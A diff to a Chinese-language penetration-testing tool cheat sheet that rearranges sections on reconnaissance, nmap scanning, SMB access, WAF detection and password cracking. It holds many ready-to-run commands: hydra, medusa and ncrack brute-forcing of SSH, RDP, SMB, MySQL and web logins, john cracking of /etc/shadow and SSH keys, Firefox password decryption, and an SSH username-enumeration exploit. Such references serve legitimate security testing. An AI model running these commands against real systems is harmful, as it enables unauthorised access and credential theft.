@@ -1,4 +1,7 @@
 ﻿相关工具
+========================================
+
+目标信息
 ----------------------------------------
 
 CDN判别
@@ -16,6 +19,25 @@ CDN判别
 - 二级域名
 	+ 搜索二级域名IP
 - `securitytrails <https://securitytrails.com>`_
+
+DNS解析域名IP查询
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- `证书子域查询 <https://crt.sh/>`_
+- `VirusTotal <https://www.virustotal.com/>`_
+- `PassiveTotal <https://passivetotal.org>`_
+- `DNSDB <https://www.dnsdb.info/>`_
+- `sitedossier <http://www.sitedossier.com/>`_
+
+资产侦察
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- ARL:资产侦察灯塔系统
+	::
+	
+		git clone https://github.com/TophantTechnology/ARL
+		cd ARL/docker/
+		docker volume create arl_db
+		docker-compose pull
+		docker-compose up -d 
 
 子域爆破
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -38,16 +60,9 @@ CDN判别
 	| ``subfinder -d yuanqisousou.com/``
 - `wydomain <https://github.com/ring04h/wydomain>`_
 
-资产侦察
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- ARL:资产侦察灯塔系统
-	::
-	
-		git clone https://github.com/TophantTechnology/ARL
-		cd ARL/docker/
-		docker volume create arl_db
-		docker-compose pull
-		docker-compose up -d 
+
+主机信息
+----------------------------------------
 
 IP信息
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -86,12 +101,92 @@ IP信息
 	+ ``arp-scan -l`` 
 - netdiscover
 
+端口扫描
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- `nmap <https://github.com/nmap/nmap>`_
+	+ 扫描方式
+		- ``TCP:-sT``
+		- ``SYN:-sS``
+		- ``ACK:-sA``
+		- ``UDP:-sU``
+		- ``RPC:-sR``
+		- ``ICMP:-sP``
+		- 禁用端口扫描:-sn
+	+ 技巧
+		- ``--host-timeout 主机超时时间 通常设置18000``
+		- ``--scan-delay 报文时间间隔 通常设置1000``
+		- ``-S 源地址 定义扫描源地址，防止被发现``
+	+ 输出
+		- ``-oN <file>``
+		- ``-oX <xml file>``
+	+ 范围扫描
+		- ``nmap 192.168.0.100-110``
+		- ``nmap 192.168.0.1/24`` 
+		- ``nmap -iL /root/target.txt`` 
+	+ 指定端口
+		- ``nmap 192.168.0.101 -p 80,8080,3306,3389`` 
+		- ``所有端口：nmap -p- 192.168.100.104``
+		- ``nmap --top-ports 1000 192.168.100.105``
+	+ 路由追踪
+		- ``nmap --traceroute 192.168.0.101`` 
+	+ 服务版本
+		- ``nmap -sV 192.168.0.101`` 
+	+ 操作系统版本
+		- ``nmap -O 192.168.0.101`` 
+	+ 探测防火墙
+		- ``nmap -sF -T4 192.168.0.101``
+	+ 插件扫描
+		- 插件列表:``ls /usr/share/nmap/scripts/ |sed 's/.nse//'>scripts.list``
+		- 插件用法：``nmap --script-help ssh_brute``
+		- 弱口令扫描:``--script=auth``
+		- 暴力破解:``--script=brute``
+		- 常见漏洞:``--script=vuln``
+		- 默认脚本:``--script=default或者-sC``
+		- 局域网服务探测:``--script=broadcast``
+		- smb字典破解:``--script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd``
+		- smb漏洞：``--script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4`` 
+		- 查看共享目录:``nmap -p 445 --script smb-ls --script-args 'share=e$,path=\,smbuser=test,smbpass=test' 192.168.137.4``
+		- ssh破解：``nmap -p22 --script ssh-brute --script-args userdb=cysec_user.txt,passdb=username.txt 172.16.226.5 -nP -vvv``
+		- 目录扫描:``nmap -sV --script=http-enum -p 80,60000 192.168.100.105``
+		- 永恒之蓝: ``nmap --script=smb-vuln-ms17-010 192.168.117.130``
+	+ 注意
+		::
+		
+			1.默认情况下，nmap只扫描默认端口。
+			2.NMAP执行结果中，端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行TCP_Wrappers服务。
+			TCP_Wrappers是一种应用级防火墙。它可以根据预设，对SSH、Telnet、FTP服务的请求进行拦截，判断
+			是否符合预设要求。如果符合，就会转发给对应的服务进程；否则，会中断连接请求。
+		
+- `zmap <https://github.com/zmap/zmap>`_
+- `masscan <https://github.com/robertdavidgraham/masscan>`_
+
+Samba服务
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- enum4linux
+- smbclient
+	``查看共享文件夹：smbclient -L //192.168.1.110 -U Jerry`` 
+	``进入共享文件夹：smbclient //192.168.1.110/share -U Jerry`` 
+	``上传文件：smbclient //192.168.1.110/share -c 'cd /home/dulingwen/Downloads; put shaolin.jpg'`` 
+	``smb直接上传：put flower.jpg`` 
+	``smb下载文件：get flower.jpg`` 
+
 系统信息
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - `linux系统信息获取LinEnum <https://github.com/rebootuser/LinEnum>`_
 - `系统信息获取PEASS-ng <https://github.com/carlospolop/PEASS-ng>`_
 
-指纹识别
+系统监控
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- `pspy64 <https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64>`_
+	|pspy|
+
+	注：其中uid为0标识具有root权限运行的进程。
+
+
+web系统
+----------------------------------------
+
+web指纹识别
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - `Wappalyzer <https://github.com/AliasIO/Wappalyzer>`_
 - `Wordpress Finger Print <https://github.com/iniqua/plecost>`_
@@ -113,151 +208,17 @@ IP信息
 - `dedecmscan <https://github.com/lengjibo/dedecmscan>`_ 织梦全版本漏洞扫描
 - `EHole <https://github.com/EdgeSecurityTeam/EHole>`_ 红队重点攻击系统指纹探测工具
 
-漏洞查询
+Waf指纹
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- searchsploit
-	+ ``更新：searchsploit -u`` 
-	+ ``poc位置：linux/remote/13853.pl``
-	+ ``下载：searchsploit -m php/webapps/7185.php`` 
-	
-firefox缓存破解
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- `Firefox_Decrypt <https://github.com/unode/firefox_decrypt>`_
-	+ ``python3 firefox_decrypt.py ../esmhp32w.default-default``
+- `identywaf <https://github.com/enablesecurity/identywaf>`_
+- `wafw00f <https://github.com/enablesecurity/wafw00f>`_
+- `WhatWaf <https://github.com/Ekultek/WhatWaf>`_
+- nmap脚本
+	+ ``--script=http-waf-detect``
+	+ ``--script=http-waf-fingerprint``
+- sqlmap
+	+ ``sqlmap -u “www.xxx.com/xxx?id=1” --identify-waf``
 
-弱密码爆破
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- `hydra(九头蛇) <https://github.com/vanhauser-thc/thc-hydra>`_
-	+ ``GUI版本(xhydra)``
-	+ ``支持协议：adam6500、asterisk、cisco、cisco-enable、cvs、firebird、ftp、ftps、http[s]-{head|get|post}、http[s]-{get|post}-form、http-proxy、http-proxy-urlenum、icq、imap[s]、irc、ldap2[s]、ldap3[-{cram|digest}md5][s]、mssql、mysql、nntp、oracle-listener、oracle-sid、pcanywhere、pcnfs、pop3[s]、postgres、radmin2、rdp、redis、rexec、rlogin、rpcap、rsh、rtsp、s7-300、sip、smb、smtp[s]、smtp-enum、snmp、socks5、ssh、sshkey、svn、teamspeak、telnet[s]、vmauthd、vnc、xmpp``
-	+ ``查看模块用法：hydra -U http-form-post``
-	+ ``smb破解：hydra -l Administrator -P pass.txt smb://192.168.47`` 
-	+ ``3389破解：hydra -l Administrator -P pass.txt rdp://192.168.47.124 -t 1 -V`` 
-	+ ``ssh破解：hydra -l msfadmin -P pass.txt ssh://192.168.47.133 -vV`` 
-	+ ``ftp破解：hydra -L user.txt -P pass.txt ftp://192.168.47.133 -s 21 -e nsr -t 1 -vV`` 
-	+ ``mysql破解：hydra 192.168.43.113 mysql -l root -P /usr/share/wordlists/rockyou.txt -t 1`` 
-	+ ``HTTP身份认证破解：hydra -L user.txt -P pass.txt 192.168.0.105 http-get``
-	+ ``HTTP身份认证破解：hydra -l admin -P /usr/share/wordlists/rockyou.txt door.legacyhangtuah.com http-get /webdav``
-	+ ``hydra -l admin -P /usr/share/wordlists/metasploit/unix_users.txt 172.16.100.103 http-get-form "/dvwa/login.php:username=^USER^&password=^PASS^&login=login:Login failed" -V``
-
-		::
-		
-				-l表示单个用户名（使用-L表示用户名列表）
-				-P表示使用以下密码列表
-				http-post-form表示表单的类型
-				/ dvwa / login-php是登录页面URL
-				username是输入用户名的表单字段
-				^ USER ^告诉Hydra使用字段中的用户名或列表
-				password是输入密码的表单字段（可以是passwd，pass等）
-				^ PASS ^告诉Hydra使用提供的密码列表
-				登录表示Hydra登录失败消息
-				登录失败是表单返回的登录失败消息
-				-V用于显示每次尝试的详细输出 
-				注：此类模块是破解HTTP协议表单数据。
-				
-	+ ``hydra -l 用户名 -P password_file 127.0.0.1 http-get-form/http-post-form "vulnerabilities/brute/:username=^USER^&password=^PASS^&submit=login:F=Username and/or password incorrect.:H=Cookie: security=low;PHPSESSID=xxxxxxx"``
-
-		::
-
-				说明：引号内的部分是自行构建的参数，这些参数用冒号隔开。
-				第一个参数是接受收据的地址；
-				第二个参数是页面接受的数据，需要破解的参数用^符号包起来；
-				第三个参数是判断破解是否成功的标志(F代表错误，S代表正确)；
-				第四个参数是本次请求中的head cookie
-				
-	+ ``-f``：破解了一个密码就停止
-	+ 注意：不支持含有token的http协议破解。
-				
-- `medusa(美杜莎) <https://github.com/jmk-foofus/medusa>`_
-	+ ``查询模块用法：medusa -M http -q``
-	+ ``medusa -H ssh1.txt -u root -P passwd.txt -M ssh``
-	+ ``medusa -h 192.168.100.105 -u root -P /home/kali/Downloads/rockyou.txt -M mysql``
-	+ ``medusa -M http -h 192.168.10.1 -u admin -P /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt -e ns -n 80 -F``
-
-		::
-		
-				-M http 允许我们指定模块。
-				-h 192.168.10.1 允许我们指定主机。
-				-u admin 允许我们指定用户。
-				-P [location of password list] 允许我们指定密码列表的位置。
-				-e ns 允许我们指定额外的密码检查。 ns 变量允许我们使用用户名作为密码，并且使用空密码。
-				-n 80 允许我们指定端口号码。
-				-F 允许我们在成功找到用户名密码组合之后停止爆破。
-				注：此模块是破解HTTP身份认证。
-				medusa -M http -h door.legacyhangtuah.com -m DIR:webdav/ -u admin -P /usr/share/wordlists/rockyou.txt -e ns -n 80 -F
-
-	+ HTTP表单破解: ``medusa -M web-form -q``
-- `htpwdScan <https://github.com/lijiejie/htpwdScan>`_
-	+ ``python htpwdScan.py -f dvwa.txt -d password=/usr/share/wordlists/metasploit/unix_users.txt  -err=\"password incorrect\"``
-	+ ``python htpwdScan.py -d passwd=password.txt -u=\"http://xxx.com/index.php?m=login&username=test&passwd=test\" -get -err=\"success\":false\"``
-- `patator <https://github.com/lanjelot/patator>`_
-- ncrack
-	+ HTTP身份认证破解：``ncrack -U /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt http://door.legacyhangtuah.com/webdav``
-- fcrackzip
-	| ``fcrackzip -b -l 6-6 -c 1 -p 000000 passwd.zip`` 
-		
-		::
-		
-			-b 暴力破解
-			-c 1 限制密码是数字
-			-l 6-6 限制密码长度为6
-			-p 000000 初始化破解起点
-	
-	| ``fcrackzip -u -D -p passwd passwd.zip``
-		
-		::
-		
-			-D -p passwd 密码本passwd文件
-			-u 不显示错误密码冗余信息
-		
-- rarcrack
-	+ ``rarcrack 文件名 --threads 线程数 --type rar|7z|zip``
-		::
-		
-			启动软件，会在当前目录生成.rar.xml文件。
-			修改abc节点，更该爆破使用的字符集。
-- john
-	+ 破解/etc/shadow
-		| ``unshadow /etc/passwd /etc/shadow > passwd_shadow``
-		
-			::
-			
-				unshadow命令基本上会结合/etc/passwd的数据和/etc/shadow的数据，
-				创建1个含有用户名和密码详细信息的文件。
-				
-		| ``unique -v -inp=allwords.txt uniques.txt``
-		
-			::
-			
-				unique工具可以从一个密码字典中去除重复行。
-		
-		| ``密码文件破解：john --wordlist=/usr/share/john/password.lst --rules passwd_shadow``
-		| ``直接破解：john passwd_shadow``
-		| ``查看上一次破解结果：john --show shadow``
-	+ 破解单条记录
-		| ``jeevan:$6$LXNakaBRJ/tL5F2a$bCgiylk/LY2MeFp5z9YZyiezsNsgj.5/cDohRgFRBNdrwi/2IPkUO0rqVIM3O8vysc48g3Zpo/sHuo.qwBf4U1:18430:0:99999:7:::``
-		| 存入password.txt文件
-		| ``john --wordlist=/usr/share/wordlists/rockyou.txt password.txt``
-		
-	+ 破解ssh私钥文件
-		| ``查看ssh2john位置：locate ssh2john``
-		| ``python /usr/share/john/ssh2john.py root>root.crack``
-		| ``john --wordlist=/usr/share/wordlists/rockyou.txt root.crack``
-	+ 破解zip密码
-		| ``zip2john tom.zip>hash5``
-		| ``john hash5 --format=PKZIP --wordlist=/home/kali/Downloads/rockyou.txt``
-		
-- wordpress密码破解
-	+ ``auxiliary/scanner/http/wordpress_xmlrpc_login``
-	+ ``wpscan --url https://www.xxxxxxx.wiki/ -U 'admin' -P /root/wordlist.txt``
-	+ `WPCracker <https://github.com/JoniRinta-Kahila/WPCracker>`_
-		- 枚举用户：``.\WPCracker.exe --enum -u <Url to victims WordPress page> -o <Output file path (OPTIONAL)>``
-		- 暴力破解：``.\WPCracker.exe --brute -u <Url to victims WordPress page> -p <Path to wordlist> -n <Username> -o <Output file path (OPTIONAL)>``
-- hashcat
-	+ 基于规则密码突变
-		- 在线文档：``https://hashcat.net/wiki/doku.php?id=rule_based_attack``
-		- 示例：``hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt``
-		
 路径及文件扫描
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ::
@@ -459,89 +420,10 @@ firefox缓存破解
 - 御剑
 - 路径爬虫 `crawlergo <https://github.com/0Kee-Team/crawlergo>`_
 
-Waf指纹
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- `identywaf <https://github.com/enablesecurity/identywaf>`_
-- `wafw00f <https://github.com/enablesecurity/wafw00f>`_
-- `WhatWaf <https://github.com/Ekultek/WhatWaf>`_
-- nmap脚本
-	+ ``--script=http-waf-detect``
-	+ ``--script=http-waf-fingerprint``
-- sqlmap
-	+ ``sqlmap -u “www.xxx.com/xxx?id=1” --identify-waf``
 
-端口扫描
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- `nmap <https://github.com/nmap/nmap>`_
-	+ 范围扫描
-		+ ``nmap 192.168.0.100-110``
-		+ ``nmap 192.168.0.1/24`` 
-		+ ``nmap -iL /root/target.txt`` 
-	+ 指定端口
-		+ ``nmap 192.168.0.101 -p 80,8080,3306,3389`` 
-		+ ``所有端口：nmap -p- 192.168.100.104``
-		+ ``nmap --top-ports 1000 192.168.100.105``
-	+ 路由追踪
-		+ ``nmap --traceroute 192.168.0.101`` 
-	+ 服务版本
-		+ ``nmap -sV 192.168.0.101`` 
-	+ 操作系统版本
-		+ ``nmap -O 192.168.0.101`` 
-	+ 探测防火墙
-		+ ``nmap -sF -T4 192.168.0.101``
-	+ 插件扫描
-		+ 插件列表:``ls /usr/share/nmap/scripts/ |sed 's/.nse//'>scripts.list``
-		+ 插件用法：``nmap --script-help ssh_brute``
-		+ 弱口令扫描:``--script=auth``
-		+ 暴力破解:``--script=brute``
-		+ 常见漏洞:``--script=vuln``
-		+ 默认脚本:``--script=default或者-sC``
-		+ 局域网服务探测:``--script=broadcast``
-		+ smb字典破解:``--script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd``
-		+ smb漏洞：``--script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4`` 
-		+ 查看共享目录:``nmap -p 445 --script smb-ls --script-args 'share=e$,path=\,smbuser=test,smbpass=test' 192.168.137.4``
-		+ ssh破解：``nmap -p22 --script ssh-brute --script-args userdb=cysec_user.txt,passdb=username.txt 172.16.226.5 -nP -vvv``
-		+ 目录扫描:``nmap -sV --script=http-enum -p 80,60000 192.168.100.105``
-	
-	::
-	
-		1.默认情况下，nmap只扫描默认端口。
-		2.NMAP执行结果中，端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行TCP_Wrappers服务。
-		TCP_Wrappers是一种应用级防火墙。它可以根据预设，对SSH、Telnet、FTP服务的请求进行拦截，判断
-		是否符合预设要求。如果符合，就会转发给对应的服务进程；否则，会中断连接请求。
-		
-- `zmap <https://github.com/zmap/zmap>`_
-- `masscan <https://github.com/robertdavidgraham/masscan>`_
 
-DNS解析域名IP查询
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- `证书子域查询 <https://crt.sh/>`_
-- `VirusTotal <https://www.virustotal.com/>`_
-- `PassiveTotal <https://passivetotal.org>`_
-- `DNSDB <https://www.dnsdb.info/>`_
-- `sitedossier <http://www.sitedossier.com/>`_
-
-搜索引擎查询
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- `Shodan <https://www.shodan.io/>`_
-- `Zoomeye <https://www.zoomeye.org/>`_
-- `fofa <https://fofa.so/>`_
-	+ title="后台管理" 搜索页面标题中含有“后台管理”关键词的网站和IP
-	+ header="thinkphp" 搜索HTTP响应头中含有“thinkphp”关键词的网站和IP
-	+ body="管理后台" 搜索html正文中含有“管理后台”关键词的网站和IP
-	+ body="Welcome to Burp Suite" 搜索公网上的BurpSuite代理
-	+ domain="itellyou.cn" 搜索根域名中带有“itellyou.cn”的网站
-	+ host="login" 搜索域名中带有"login"关键词的网站
-	+ port="3388" && country=CN 搜索开放3388端口并且位于中国的IP
-	+ ip="120.27.6.1/24" 搜索指定IP或IP段
-	+ cert="phpinfo.me" 搜索证书(如https证书、imaps证书等)中含有"phpinfo.me"关键词的网站和IP
-	+ ports="3306,443,22" 搜索同时开启3306端口、443端口和22端口的IP
-	+ ports=="3306,443,22" 搜索只开启3306端口、443端口和22端口的IP
-	+ && – 表示逻辑与
-	+ || – 表示逻辑或
-- `scans <https://scans.io/>`_
-- `Just Metadata <https://github.com/FortyNorthSecurity/Just-Metadata>`_
-- `publicwww - Find Web Pages via Snippet <https://publicwww.com/>`_
+暴力破解
+----------------------------------------
 
 字典
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -580,35 +462,169 @@ DNS解析域名IP查询
 	+ 制作6为数字字典 ``crunch 6 6  0123456789 –o num6.dic`` 
 	+ 制作139开头的手机密码字典 ``crunch 11 11  +0123456789 -t 139%%%%%%%% -o num13.dic`` 
 
-Samba
+firefox缓存破解
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- enum4linux
-- smbclient
-	``查看共享文件夹：smbclient -L //192.168.1.110 -U Jerry`` 
-	``进入共享文件夹：smbclient //192.168.1.110/share -U Jerry`` 
-	``上传文件：smbclient //192.168.1.110/share -c 'cd /home/dulingwen/Downloads; put shaolin.jpg'`` 
-	``smb直接上传：put flower.jpg`` 
-	``smb下载文件：get flower.jpg`` 
-	
+- `Firefox_Decrypt <https://github.com/unode/firefox_decrypt>`_
+	+ ``python3 firefox_decrypt.py ../esmhp32w.default-default``
+
 web破解
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - `Brute_force <..//_static//Brute_force.py>`_
 
-系统监控
+弱密码爆破
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- `pspy64 <https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64>`_
-	|pspy|
+- `hydra(九头蛇) <https://github.com/vanhauser-thc/thc-hydra>`_
+	+ ``GUI版本(xhydra)``
+	+ ``支持协议：adam6500、asterisk、cisco、cisco-enable、cvs、firebird、ftp、ftps、http[s]-{head|get|post}、http[s]-{get|post}-form、http-proxy、http-proxy-urlenum、icq、imap[s]、irc、ldap2[s]、ldap3[-{cram|digest}md5][s]、mssql、mysql、nntp、oracle-listener、oracle-sid、pcanywhere、pcnfs、pop3[s]、postgres、radmin2、rdp、redis、rexec、rlogin、rpcap、rsh、rtsp、s7-300、sip、smb、smtp[s]、smtp-enum、snmp、socks5、ssh、sshkey、svn、teamspeak、telnet[s]、vmauthd、vnc、xmpp``
+	+ ``查看模块用法：hydra -U http-form-post``
+	+ ``smb破解：hydra -l Administrator -P pass.txt smb://192.168.47`` 
+	+ ``3389破解：hydra -l Administrator -P pass.txt rdp://192.168.47.124 -t 1 -V`` 
+	+ ``ssh破解：hydra -l msfadmin -P pass.txt ssh://192.168.47.133 -vV`` 
+	+ ``ftp破解：hydra -L user.txt -P pass.txt ftp://192.168.47.133 -s 21 -e nsr -t 1 -vV`` 
+	+ ``mysql破解：hydra 192.168.43.113 mysql -l root -P /usr/share/wordlists/rockyou.txt -t 1`` 
+	+ ``HTTP身份认证破解：hydra -L user.txt -P pass.txt 192.168.0.105 http-get``
+	+ ``HTTP身份认证破解：hydra -l admin -P /usr/share/wordlists/rockyou.txt door.legacyhangtuah.com http-get /webdav``
+	+ ``hydra -l admin -P /usr/share/wordlists/metasploit/unix_users.txt 172.16.100.103 http-get-form "/dvwa/login.php:username=^USER^&password=^PASS^&login=login:Login failed" -V``
 
-	注：其中uid为0标识具有root权限运行的进程。
-	
-SSH用户名枚举
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- CVE-2018-15473-Exploit
-	::
-	
-		https://github.com/Rhynorater/CVE-2018-15473-Exploit/blob/master/sshUsernameEnumExploit.py
-		python sshUsernameEnumExploit.py --port 22 --userList /home/kali/Downloads/rockyou.txt 192.168.100.103 
+		::
 		
-- auxiliary(scanner/ssh/ssh_enumusers)
+				-l表示单个用户名（使用-L表示用户名列表）
+				-P表示使用以下密码列表
+				http-post-form表示表单的类型
+				/ dvwa / login-php是登录页面URL
+				username是输入用户名的表单字段
+				^ USER ^告诉Hydra使用字段中的用户名或列表
+				password是输入密码的表单字段（可以是passwd，pass等）
+				^ PASS ^告诉Hydra使用提供的密码列表
+				登录表示Hydra登录失败消息
+				登录失败是表单返回的登录失败消息
+				-V用于显示每次尝试的详细输出 
+				注：此类模块是破解HTTP协议表单数据。
+				
+	+ ``hydra -l 用户名 -P password_file 127.0.0.1 http-get-form/http-post-form "vulnerabilities/brute/:username=^USER^&password=^PASS^&submit=login:F=Username and/or password incorrect.:H=Cookie: security=low;PHPSESSID=xxxxxxx"``
+
+		::
+
+				说明：引号内的部分是自行构建的参数，这些参数用冒号隔开。
+				第一个参数是接受收据的地址；
+				第二个参数是页面接受的数据，需要破解的参数用^符号包起来；
+				第三个参数是判断破解是否成功的标志(F代表错误，S代表正确)；
+				第四个参数是本次请求中的head cookie
+				
+	+ ``-f``：破解了一个密码就停止
+	+ 注意：不支持含有token的http协议破解。
+				
+- `medusa(美杜莎) <https://github.com/jmk-foofus/medusa>`_
+	+ ``查询模块用法：medusa -M http -q``
+	+ ``medusa -H ssh1.txt -u root -P passwd.txt -M ssh``
+	+ ``medusa -h 192.168.100.105 -u root -P /home/kali/Downloads/rockyou.txt -M mysql``
+	+ ``medusa -M http -h 192.168.10.1 -u admin -P /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt -e ns -n 80 -F``
+
+		::
+		
+				-M http 允许我们指定模块。
+				-h 192.168.10.1 允许我们指定主机。
+				-u admin 允许我们指定用户。
+				-P [location of password list] 允许我们指定密码列表的位置。
+				-e ns 允许我们指定额外的密码检查。 ns 变量允许我们使用用户名作为密码，并且使用空密码。
+				-n 80 允许我们指定端口号码。
+				-F 允许我们在成功找到用户名密码组合之后停止爆破。
+				注：此模块是破解HTTP身份认证。
+				medusa -M http -h door.legacyhangtuah.com -m DIR:webdav/ -u admin -P /usr/share/wordlists/rockyou.txt -e ns -n 80 -F
+
+	+ HTTP表单破解: ``medusa -M web-form -q``
+- `htpwdScan <https://github.com/lijiejie/htpwdScan>`_
+	+ ``python htpwdScan.py -f dvwa.txt -d password=/usr/share/wordlists/metasploit/unix_users.txt  -err=\"password incorrect\"``
+	+ ``python htpwdScan.py -d passwd=password.txt -u=\"http://xxx.com/index.php?m=login&username=test&passwd=test\" -get -err=\"success\":false\"``
+- `patator <https://github.com/lanjelot/patator>`_
+- ncrack
+	+ HTTP身份认证破解：``ncrack -U /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt http://door.legacyhangtuah.com/webdav``
+- fcrackzip
+	| ``fcrackzip -b -l 6-6 -c 1 -p 000000 passwd.zip`` 
+		
+		::
+		
+			-b 暴力破解
+			-c 1 限制密码是数字
+			-l 6-6 限制密码长度为6
+			-p 000000 初始化破解起点
+	
+	| ``fcrackzip -u -D -p passwd passwd.zip``
+		
+		::
+		
+			-D -p passwd 密码本passwd文件
+			-u 不显示错误密码冗余信息
+		
+- rarcrack
+	+ ``rarcrack 文件名 --threads 线程数 --type rar|7z|zip``
+		::
+		
+			启动软件，会在当前目录生成.rar.xml文件。
+			修改abc节点，更该爆破使用的字符集。
+- john
+	+ 破解/etc/shadow
+		| ``unshadow /etc/passwd /etc/shadow > passwd_shadow``
+		
+			::
+			
+				unshadow命令基本上会结合/etc/passwd的数据和/etc/shadow的数据，
+				创建1个含有用户名和密码详细信息的文件。
+				
+		| ``unique -v -inp=allwords.txt uniques.txt``
+		
+			::
+			
+				unique工具可以从一个密码字典中去除重复行。
+		
+		| ``密码文件破解：john --wordlist=/usr/share/john/password.lst --rules passwd_shadow``
+		| ``直接破解：john passwd_shadow``
+		| ``查看上一次破解结果：john --show shadow``
+	+ 破解单条记录
+		| ``jeevan:$6$LXNakaBRJ/tL5F2a$bCgiylk/LY2MeFp5z9YZyiezsNsgj.5/cDohRgFRBNdrwi/2IPkUO0rqVIM3O8vysc48g3Zpo/sHuo.qwBf4U1:18430:0:99999:7:::``
+		| 存入password.txt文件
+		| ``john --wordlist=/usr/share/wordlists/rockyou.txt password.txt``
+		
+	+ 破解ssh私钥文件
+		| ``查看ssh2john位置：locate ssh2john``
+		| ``python /usr/share/john/ssh2john.py root>root.crack``
+		| ``john --wordlist=/usr/share/wordlists/rockyou.txt root.crack``
+	+ 破解zip密码
+		| ``zip2john tom.zip>hash5``
+		| ``john hash5 --format=PKZIP --wordlist=/home/kali/Downloads/rockyou.txt``
+		
+- wordpress密码破解
+	+ ``auxiliary/scanner/http/wordpress_xmlrpc_login``
+	+ ``wpscan --url https://www.xxxxxxx.wiki/ -U 'admin' -P /root/wordlist.txt``
+	+ `WPCracker <https://github.com/JoniRinta-Kahila/WPCracker>`_
+		- 枚举用户：``.\WPCracker.exe --enum -u <Url to victims WordPress page> -o <Output file path (OPTIONAL)>``
+		- 暴力破解：``.\WPCracker.exe --brute -u <Url to victims WordPress page> -p <Path to wordlist> -n <Username> -o <Output file path (OPTIONAL)>``
+- hashcat
+	+ 基于规则密码突变
+		- 在线文档：``https://hashcat.net/wiki/doku.php?id=rule_based_attack``
+		- 示例：``hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt``
+
+
+搜索引擎查询
+----------------------------------------
+- `Shodan <https://www.shodan.io/>`_
+- `Zoomeye <https://www.zoomeye.org/>`_
+- `fofa <https://fofa.so/>`_
+	+ title="后台管理" 搜索页面标题中含有“后台管理”关键词的网站和IP
+	+ header="thinkphp" 搜索HTTP响应头中含有“thinkphp”关键词的网站和IP
+	+ body="管理后台" 搜索html正文中含有“管理后台”关键词的网站和IP
+	+ body="Welcome to Burp Suite" 搜索公网上的BurpSuite代理
+	+ domain="itellyou.cn" 搜索根域名中带有“itellyou.cn”的网站
+	+ host="login" 搜索域名中带有"login"关键词的网站
+	+ port="3388" && country=CN 搜索开放3388端口并且位于中国的IP
+	+ ip="120.27.6.1/24" 搜索指定IP或IP段
+	+ cert="phpinfo.me" 搜索证书(如https证书、imaps证书等)中含有"phpinfo.me"关键词的网站和IP
+	+ ports="3306,443,22" 搜索同时开启3306端口、443端口和22端口的IP
+	+ ports=="3306,443,22" 搜索只开启3306端口、443端口和22端口的IP
+	+ && – 表示逻辑与
+	+ || – 表示逻辑或
+- `scans <https://scans.io/>`_
+- `Just Metadata <https://github.com/FortyNorthSecurity/Just-Metadata>`_
+- `publicwww - Find Web Pages via Snippet <https://publicwww.com/>`_
 
 .. |pspy| image:: ../images/pspy.jpg
